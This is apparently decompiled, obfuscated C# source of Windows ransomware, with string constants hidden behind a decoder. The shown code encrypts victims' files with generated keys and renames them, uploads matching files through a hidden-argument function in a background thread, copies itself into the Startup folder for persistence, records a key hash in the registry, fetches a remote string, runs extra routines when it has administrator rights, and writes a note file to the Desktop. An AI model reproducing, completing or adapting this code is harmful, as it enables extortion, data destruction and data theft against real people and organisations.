							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107348698) + ex6.Message + getString_0(107396514));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							return;
						}
						if (NWwyysQYwQDK != getString_0(107397879))
						{
							CS_0024_003C_003E8__locals0.tDwFwsGDrP += NWwyysQYwQDK;
						}
						if (pRibgXhmfietto == getString_0(107396828))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in tnUDcbYyevrzGRJA)
								{
									if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.xIhpFsMthiO.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == tdXNNsWJFtDVWeIAq.getString_0(107396838))
									{
										if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.tDwFwsGDrP).Length)
										{
											try
											{
												AVKODeXgMr.tvyItwYqcU(tdXNNsWJFtDVWeIAq.getString_0(107401057), tdXNNsWJFtDVWeIAq.getString_0(107401052), tdXNNsWJFtDVWeIAq.getString_0(107401007), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.tDwFwsGDrP.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == tdXNNsWJFtDVWeIAq.getString_0(107396372))
									{
										try
										{
											AVKODeXgMr.tvyItwYqcU(tdXNNsWJFtDVWeIAq.getString_0(107401057), tdXNNsWJFtDVWeIAq.getString_0(107401052), tdXNNsWJFtDVWeIAq.getString_0(107401007), CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										}
										catch
										{
										}
									}
								}
							});
							thread2.IsBackground = false;
							thread2.Priority = ThreadPriority.Normal;
							thread2.Start();
						}
						string text = VfObglZXpshJy.puTvlrNJxrKCPF(32);
						string text2 = getString_0(107400934);
						text2 = (UpNccIaFzBadyA ? VfObglZXpshJy.ZAaQeGPmgdp() : getString_0(107400934));
						string s = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dhEsUcbXeBeyR == getString_0(107396362))
						{
							byte[] array = null;
							byte[] byte_ = pNCPZOFhXOgiy.PLYaACyiXPLfDqos(CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
							if (!pNCPZOFhXOgiy.nKguzTWYAHcXu(QaGqIxJvWtgUo: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pNCPZOFhXOgiy.xjeqXDBiuVwBVy(byte_, Convert.FromBase64String(OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? FRFdLnqaFph.BWvSzInVLSLIKib(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : FRFdLnqaFph.BWvSzInVLSLIKib(byte_, Convert.FromBase64String(OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), NrVjtCgSTarJ: CS_0024_003C_003E8__locals0.tDwFwsGDrP, VLHQPqpLBGisux: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!UpNccIaFzBadyA)
						{
							if (!LjjjikaIyK.pPZVhaEwmPX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!LjjjikaIyK.pPZVhaEwmPX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (OtvlrYHFRq)
						{
							NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
						}
						string text3 = VfObglZXpshJy.puTvlrNJxrKCPF(32);
						string text4 = getString_0(107400934);
						text4 = (UpNccIaFzBadyA ? VfObglZXpshJy.ZAaQeGPmgdp() : getString_0(107400934));
						string s2 = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (NWwyysQYwQDK != getString_0(107397879))
						{
							if (!NbfRNVirWcO)
							{
								if (!UpNccIaFzBadyA)
								{
									xpGkySSqwDX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk);
								}
								else
								{
									xpGkySSqwDX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!UpNccIaFzBadyA)
									{
										KmXLFgoTfYmkE(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
									}
									else
									{
										KmXLFgoTfYmkE(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex11)
								{
									if (SWaMdrdKGgzowGl)
									{
										try
										{
											File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107397833) + ex11.Message + getString_0(107396514));
										}
										catch (Exception)
										{
										}
									}
									ZzaknwGiCeEd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals0.tDwFwsGDrP);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!NbfRNVirWcO)
						{
							if (!UpNccIaFzBadyA)
							{
								xpGkySSqwDX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107397874), nQCMwcWKyQk);
							}
							else
							{
								xpGkySSqwDX(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107397874), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!UpNccIaFzBadyA)
								{
									KmXLFgoTfYmkE(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
								}
								else
								{
									KmXLFgoTfYmkE(CS_0024_003C_003E8__locals0.tDwFwsGDrP, CS_0024_003C_003E8__locals0.tDwFwsGDrP, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex14)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398628) + CS_0024_003C_003E8__locals0.tDwFwsGDrP + getString_0(107397833) + ex14.Message + getString_0(107396514));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								return;
							}
						}
						if (UpNccIaFzBadyA)
						{
							if (NWwyysQYwQDK != getString_0(107397879))
							{
								KFuNWiOQTHKqWciPe(CS_0024_003C_003E8__locals0.tDwFwsGDrP + NWwyysQYwQDK, bytes2);
							}
							else
							{
								KFuNWiOQTHKqWciPe(CS_0024_003C_003E8__locals0.tDwFwsGDrP, bytes2);
							}
						}
					}
					end_IL_0348_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0b55;
			IL_0b55:
			aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals0.tDwFwsGDrP);
		}

		static evlxOkrixnZkwgY()
		{
			Strings.CreateGetStringDelegate(typeof(evlxOkrixnZkwgY));
		}
	}

	private sealed class ZBEFzVzYsSt
	{
		public string JgoRvgBlnpx;

		public string pnnxcTqhyFOc;

		public void _003CEncrypt2_003Eb__41()
		{
			while (true)
			{
				try
				{
					File.Delete(JgoRvgBlnpx);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__42()
		{
			while (true)
			{
				try
				{
					if (File.Exists(pnnxcTqhyFOc))
					{
						File.Delete(pnnxcTqhyFOc);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string mkgreXsNDfWo;

	public static byte[] nQCMwcWKyQk;

	public static string QotWPeyjvzjx;

	public static string FoLsSeMcEVuV;

	public static List<string> eaZULefnOUcJVI;

	public static List<string> DWWiJyUdyGLZ;

	public static string mNPIOHsqKQLjYmM;

	public static string OxsDDfqLEi;

	public static string lXgIUpLgAi;

	public static string GThDVKInjH;

	public static string utoTLqCAZdXAT;

	public static int HxkcxNLXyTDaNa;

	public static string NgbDiBVJKDTW;

	public static string yyZHaDaxUisnQ;

	public static string bLsbDQXmZdNKY;

	public static string gRvYTwveWAbrj;

	public static string aYGZeCWKzRZALiE;

	public static string xssnOTnwBJDngh;

	public static string AUaVXVYfCAD;

	public static string DdPuPlUptL;

	public static List<string> ZislTiThZFHv;

	public static List<string> IDUZlSGaIfn;

	public static string XaypzBwanzwZ;

	public static string EopvfOZJdoX;

	public static string bGtevrhmXNGWmrdhzSx;

	public static List<string> JEkdiihxCoWf;

	public static string HohHoEgJewvBWz;

	private static string JNWYtfmGycaH;

	public static string gsXyoeFOorGZ;

	public static string vNvhWDXlFGgZo;

	public static List<string> SoVrjAqLQHDY;

	public static List<string> tKhSHdXkDw;

	public static List<string> FcllHXSYzCkoLu;

	public static List<string> MRwbBvIEaNYw;

	public static string fJgPhlsQHtYagv;

	public static List<string> KIKFUpmawnRBIE;

	public static List<string> WjopLCEDSl;

	public static string dNiPJscrdZ;

	public static string pRwaCpJBKvM;

	internal static DateTime AiPmmCrNxON;

	internal static DateTime TyxvmRxEqTldBX;

	public static string krdgQbbXWsBnkAs;

	public static string bQealBkUmzhp;

	public static string IjKkEPdMxTo;

	public static string SsLdaQJOERuN;

	public static string zCYQvPmGdWb;

	public static string SwTuLSeNkXgX;

	public static string GZbePnAiKIwM;

	public static string pRibgXhmfietto;

	public static List<string> tnUDcbYyevrzGRJA;

	public static string OGIisKmpnCtjYJtSZ;

	public static string dKLzVpzOOKvyJbR;

	public static string HmOIvziEgj;

	public static string wWsTKhWTnA;

	public static string ceBfodBwRY;

	public static string YrUNJYkfZORc;

	public static string TECyIxCjZZeuQoS;

	public static string TLvIKeJnVejcNG;

	public static string cfLMhLbiCC;

	public static string dPIYrIPkEeCv;

	public static string LfrLWEkFCBwUa;

	public static string LHozEvFKfaDyxN;

	public static string ZQLLErbedcYeoR;

	public static string sWPChGvxft;

	public static string iEmzWvVANWWhs;

	public static string OXmgxFpvUExT;

	public static string EMMMLIMedETY;

	public static string OOffFbZtXHucK;

	public static string eBjqIYGqqxZnwj;

	public static string ZLERFztvScvXGTf;

	public static string ThomocmQwcHBb;

	public static string jIEUXOWHIovDRKPS;

	public static string lanIsMFtITLe;

	public static string cFytzeDiRIaBA;

	public static string ueuvoVAMScuH;

	public static string cXFsslHOuYyK;

	public static string dhEsUcbXeBeyR;

	public static string pUPogXfTsHTC;

	public static string XxUTdtdLXHJQFmlnR;

	public static string[] upziyoWzyCa;

	public static string RrpEvBQBLONZKo;

	public static bool OTLCmOpFsMP;

	public static string EBZNaOLOtuSLZ;

	public static bool UpNccIaFzBadyA;

	public static bool GyAtBojDqJQga;

	public static bool ZuXmDgobJnjb;

	public static bool XeXEhFhfYVvh;

	public static string bDDJFCkjBbYQ;

	public static bool SWaMdrdKGgzowGl;

	public static bool UaZSFbxCjFNZv;

	public static bool jnImjWIMcpl;

	public static bool bTMUTlJGkGOO;

	public static bool NbfRNVirWcO;

	public static string IKRtRLOSqagD;

	public static bool SidumIOOlYmWUm;

	public static Stopwatch VxQUKIskXHMm;

	public static int ZzaknwGiCeEd;

	public static int DPjjDEUnrYJ;

	public static bool OtvlrYHFRq;

	public static string YgTmUCLcTtww;

	public static string[] PheHPPQQekLUCKI;

	public static List<string> GDqBfWNbeWwjD;

	public static int PGvCWVOLTGYXz;

	public static bool uBpdQdBJjeZ;

	public static bool DBkpQAKkEJYsTWP;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			qfTxGPzVjXWk CS_0024_003C_003E8__locals0 = new qfTxGPzVjXWk();
			CS_0024_003C_003E8__locals0.vjohKiJyzSRaUeWhX = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.vjohKiJyzSRaUeWhX) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			NXknOtFEqo.vkxqBHwjWLV(JNWYtfmGycaH);
		}
		catch (Exception)
		{
		}
		try
		{
			if (cXFsslHOuYyK == getString_0(107396811))
			{
				Thread thread = new Thread(ZjcxcgQPvCuA.mfXOqYzpYIUz);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (bLsbDQXmZdNKY == getString_0(107396811))
		{
			Thread.Sleep(int.Parse(gRvYTwveWAbrj));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && GZbePnAiKIwM == getString_0(107396811))
		{
			try
			{
				ayEtBVKeJdAGOlKU(OEjiexKEqeO(getString_0(107396806)));
			}
			catch
			{
			}
		}
		try
		{
			if (AUaVXVYfCAD == getString_0(107396811) && JzilhFeKxSjAW.jGRWOHyUCfri())
			{
				new fAyYLEKmguzziO().CtPYYpoqtgbv(bool_0: false);
				JzilhFeKxSjAW.xorPzZICxkUEFahk();
			}
		}
		catch (Exception)
		{
		}
		if (EopvfOZJdoX == getString_0(107396811) && JzilhFeKxSjAW.jGRWOHyUCfri())
		{
			new fAyYLEKmguzziO().CtPYYpoqtgbv(bool_0: false);
			new fAyYLEKmguzziO().qYaOatAdXoc();
		}
		if (yyZHaDaxUisnQ == getString_0(107396811))
		{
			EqjRAwtlwHJBA.NIaOzqqXut();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397181);
			string text2 = text + Path.GetFileName(fileName);
			if (utoTLqCAZdXAT == getString_0(107396811) && fileName != text2)
			{
				Thread thread2 = new Thread(hLkCZwvYlBIGN);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (mNPIOHsqKQLjYmM == getString_0(107396811) && mainModule != null && fileName != text2)
			{
				try
				{
					HxkcxNLXyTDaNa = fvSzlSraUXFgd(0, ZislTiThZFHv.Count);
					File.Copy(fileName, text + ZislTiThZFHv[HxkcxNLXyTDaNa], overwrite: true);
					Process.Start(text + ZislTiThZFHv[HxkcxNLXyTDaNa]);
					IPHnSCfxuwkpRn();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (dNiPJscrdZ == getString_0(107396811) && DateTime.Now < AiPmmCrNxON)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (pRwaCpJBKvM == getString_0(107396811) && DateTime.Now > TyxvmRxEqTldBX)
			{
				IPHnSCfxuwkpRn();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107397176);
			if (ZQLLErbedcYeoR == getString_0(107396811))
			{
				Console.WriteLine(getString_0(107397070));
			}
			VxQUKIskXHMm.Start();
		}
		catch
		{
		}
		kfmVmRBkmLyJ();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> source = tKhSHdXkDw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397795)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> fcllHXSYzCkoLu = FcllHXSYzCkoLu;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397750)), string_0);
					};
				}
				Parallel.ForEach(fcllHXSYzCkoLu, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (XxUTdtdLXHJQFmlnR == getString_0(107396811))
				{
					string[] source2 = upziyoWzyCa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107397750)), getString_0(107398237) + string_0 + getString_0(107398228));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!rLhkxjtAGaYQ().Contains(getString_0(107397997)))
				{
					LaKkDEmcTxZa(fJgPhlsQHtYagv);
				}
				else
				{
					List<string> mRwbBvIEaNYw = MRwbBvIEaNYw;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							nYTitVLsoNLJb(OEjiexKEqeO(XOtQxzFPxuTjra(getString_0(107398255))), string_0);
						};
					}
					Parallel.ForEach(mRwbBvIEaNYw, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> kIKFUpmawnRBIE = KIKFUpmawnRBIE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107398198)), string_0);
					};
				}
				Parallel.ForEach(kIKFUpmawnRBIE, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397029))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397029)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396980)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !eaZULefnOUcJVI.Contains(text6) && text6 != getString_0(107396447) && text6 != getString_0(107396458) && text6 != getString_0(107396405))
								{
									eaZULefnOUcJVI.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396376)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396395))
						{
							ZQLLErbedcYeoR = getString_0(107396811);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396386))
						{
							ZQLLErbedcYeoR = getString_0(107396345);
						}
					}
					if (text3.Contains(getString_0(107396340)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396395))
						{
							SidumIOOlYmWUm = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396386))
						{
							SidumIOOlYmWUm = true;
						}
					}
					if (text3.Contains(getString_0(107396355)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396395))
						{
							SWaMdrdKGgzowGl = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396386))
						{
							SWaMdrdKGgzowGl = false;
						}
					}
					if (text3.Contains(getString_0(107396310)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396395))
						{
							uBpdQdBJjeZ = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396386))
						{
							uBpdQdBJjeZ = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107396281) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (ZQLLErbedcYeoR == getString_0(107396345))
		{
			ImKvZHKFlbCzy();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ZuXmDgobJnjb)
			{
				try
				{
					Thread thread4 = new Thread(ZzeebxnKDWpc.jbPlKtSXcQmYNZ);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			nYTitVLsoNLJb(getString_0(107396268), OEjiexKEqeO(getString_0(107396223)));
		}
		SecureString secureString = new SecureString();
		if (IjKkEPdMxTo == getString_0(107396345))
		{
			OxsDDfqLEi = VfObglZXpshJy.puTvlrNJxrKCPF(32);
			lXgIUpLgAi = VfObglZXpshJy.ZAaQeGPmgdp();
		}
		else
		{
			OxsDDfqLEi = getString_0(107396662);
		}
		GThDVKInjH = mhNHGBImqIMFfl.QNVOHiUyNEwNRw(OxsDDfqLEi + lXgIUpLgAi);
		if (!UpNccIaFzBadyA)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(OEjiexKEqeO(getString_0(107396649)));
				if (registryKey != null)
				{
					registryKey.SetValue(OEjiexKEqeO(getString_0(107396572)) + (registryKey.ValueCount + 1), GThDVKInjH);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(OEjiexKEqeO(getString_0(107396649)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(OEjiexKEqeO(getString_0(107396572)) + (registryKey2.ValueCount + 1), GThDVKInjH);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (TLvIKeJnVejcNG == getString_0(107396811))
		{
			CRcSCrOxgKM();
		}
		if (jnImjWIMcpl)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD), string.Concat(OEjiexKEqeO(getString_0(107396563)), new WebClient().DownloadString(OEjiexKEqeO(getString_0(107396538))), getString_0(107396497), OEjiexKEqeO(getString_0(107396524)), DateTime.Now, getString_0(107396497), OEjiexKEqeO(getString_0(107396483)), GThDVKInjH));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), IKRtRLOSqagD), getString_0(107395914) + GThDVKInjH);
				}
			}
			catch (Exception ex11)
			{
				if (SWaMdrdKGgzowGl)
				{
					try
					{
						File.AppendAllText(bDDJFCkjBbYQ, getString_0(107395885) + ex11.Message + getString_0(107396497));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		ZeZyKbdysXZlWpj.nvTJKZDbqwJM(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ZLERFztvScvXGTf), VpswVOavVAxq(GThDVKInjH), null, null, getString_0(107395804), getString_0(107395819), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			EMfHimKXkHfuX();
		}
		try
		{
			try
			{
				if (SidumIOOlYmWUm)
				{
					Console.WriteLine(getString_0(107395770));
				}
			}
			catch
			{
			}
			xAIWeJOsoFFQ(new string[10]
			{
				getString_0(107395753),
				getString_0(107396172),
				getString_0(107396123),
				getString_0(107396050),
				getString_0(107395997),
				getString_0(107395968),
				getString_0(107395383),
				getString_0(107395394),
				getString_0(107395365),
				getString_0(107395272)
			}, new string[100]
			{
				getString_0(107395227),
				getString_0(107395222),
				getString_0(107395217),
				getString_0(107395240),
				getString_0(107395235),
				getString_0(107395198),
				getString_0(107395193),
				getString_0(107395188),
				getString_0(107395215),
				getString_0(107395210),
				getString_0(107395205),
				getString_0(107395200),
				getString_0(107395671),
				getString_0(107395666),
				getString_0(107395689),
				getString_0(107395684),
				getString_0(107395647),
				getString_0(107395642),
				getString_0(107395637),
				getString_0(107395632),
				getString_0(107395655),
				getString_0(107395650),
				getString_0(107395613),
				getString_0(107395608),
				getString_0(107395603),
				getString_0(107395630),
				getString_0(107395625),
				getString_0(107395620),
				getString_0(107395583),
				getString_0(107395578),
				getString_0(107395573),
				getString_0(107395568),
				getString_0(107395595),
				getString_0(107395590),
				getString_0(107395549),
				getString_0(107395544),
				getString_0(107395539),
				getString_0(107395566),
				getString_0(107395193),
				getString_0(107395561),
				getString_0(107395215),
				getString_0(107395552),
				getString_0(107395515),
				getString_0(107395510),
				getString_0(107395505),
				getString_0(107395532),
				getString_0(107395527),
				getString_0(107395522),
				getString_0(107395485),
				getString_0(107395480),
				getString_0(107395475),
				getString_0(107395502),
				getString_0(107395497),
				getString_0(107395492),
				getString_0(107395455),
				getString_0(107395450),
				getString_0(107395445),
				getString_0(107395440),
				getString_0(107395463),
				getString_0(107395458),
				getString_0(107394905),
				getString_0(107394924),
				getString_0(107395561),
				getString_0(107394879),
				getString_0(107394870),
				getString_0(107394893),
				getString_0(107394884),
				getString_0(107394843),
				getString_0(107394834),
				getString_0(107394861),
				getString_0(107394852),
				getString_0(107394811),
				getString_0(107394802),
				getString_0(107394829),
				getString_0(107394824),
				getString_0(107394819),
				getString_0(107394782),
				getString_0(107394777),
				getString_0(107394772),
				getString_0(107394795),
				getString_0(107394790),
				getString_0(107394785),
				getString_0(107394748),
				getString_0(107394743),
				getString_0(107394738),
				getString_0(107394761),
				getString_0(107394752),
				getString_0(107394715),
				getString_0(107395595),
				getString_0(107394710),
				getString_0(107394705),
				getString_0(107394732),
				getString_0(107394727),
				getString_0(107394722),
				getString_0(107394681),
				getString_0(107394676),
				getString_0(107394703),
				getString_0(107394694),
				getString_0(107394689),
				getString_0(107395164)
			}, new string[0], OxsDDfqLEi, getString_0(107395159));
		}
		catch (Exception ex13)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107395174) + ex13.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149));
				streamWriter.WriteLine(OEjiexKEqeO(getString_0(107395116)));
				streamWriter.WriteLine(getString_0(107396497));
				streamWriter.WriteLine(OEjiexKEqeO(getString_0(107389842)));
				streamWriter.WriteLine(GThDVKInjH);
				if (gsXyoeFOorGZ == getString_0(107396345))
				{
					streamWriter.WriteLine(getString_0(107396497));
					streamWriter.WriteLine(OEjiexKEqeO(getString_0(107389809)) + Convert.ToString(JEkdiihxCoWf.Count));
				}
				if (OtvlrYHFRq)
				{
					streamWriter.WriteLine(getString_0(107396497));
					streamWriter.WriteLine(OEjiexKEqeO(getString_0(107389252)));
